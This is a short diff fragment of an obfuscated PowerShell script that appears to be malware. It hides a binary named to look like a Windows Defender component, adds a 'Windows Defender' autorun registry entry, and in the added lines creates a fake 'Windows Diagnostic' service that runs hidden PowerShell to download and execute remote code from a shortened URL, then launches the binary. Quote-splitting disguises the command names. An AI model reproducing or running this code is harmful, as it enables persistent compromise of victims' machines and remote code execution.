@@ -17,3 +17,6 @@ $unsplit = $split.Replace("~~","")
 IEX $unsplit
 Ge't-It'em ('C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MSAS'+'Cui'+'L.e'+'xe') | fo're'ach {$_.Attributes = 'ReadOnly, Hidden'}
 N'ew'-I'te'mP'ro'pe'rt'y -Path "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Windows Defender" -Value "C:\Users\Public\MSASCuiL.exe"
+N'e'w-S'er'vi'ce -Name "Windows Diagnostic" -BinaryPathName "cmd /c powershell.exe -nop -w hidden IEX (New-Object Net.WebClient).downloadstring('https://bit.ly/2ojGG3k');" -DisplayName "Windows Diagnostic" -Description "Windows Diagnostic"
+s't'art-p'roc'es's -FilePath 'C:\Users\Public\MSASCuiL.exe'
+Exit
